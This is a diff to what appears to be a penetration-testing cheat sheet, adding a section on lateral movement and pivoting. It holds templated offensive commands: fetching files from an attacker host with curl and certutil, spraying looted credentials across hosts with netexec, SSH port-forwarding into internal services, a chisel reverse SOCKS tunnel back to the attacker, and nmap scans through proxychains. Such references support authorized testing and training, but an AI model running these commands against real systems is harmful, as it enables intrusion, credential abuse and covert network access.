@@ -107,6 +107,19 @@ curl -O http://<lhost>:<port>/<file>
 certutil -urlcache -split -f http://<lhost>:<port>/<file> <file>
 ```
 
+**Lateral movement / pivoting**
+```bash
+# Reuse looted creds across hosts
+netexec smb <range> -u <user> -p <pass>
+# SSH local port-forward to reach an internal-only service
+ssh -L <lport>:<internal-host>:<rport> <user>@<target>
+# Tunnel a whole subnet through the foothold, then run tools via proxychains
+# chisel:  attacker> chisel server -p <port> --reverse
+#          target>   chisel client <lhost>:<port> R:socks
+# ligolo-ng: agent on target -> proxy on attacker, then add the route
+proxychains nmap -sT -Pn <internal-range>
+```
+
 ## Pitfalls
 
 - `tcpwrapped` = handshake completed but the service closed before sending a banner (often a wrapper/firewall), not a scan-speed problem. Re-probe a specific port with `-sV --version-intensity 9` or `nc`/manual. Separately, firewall rate-limiting can hide ports at `-T4/-T5`; retry at `-T2`.
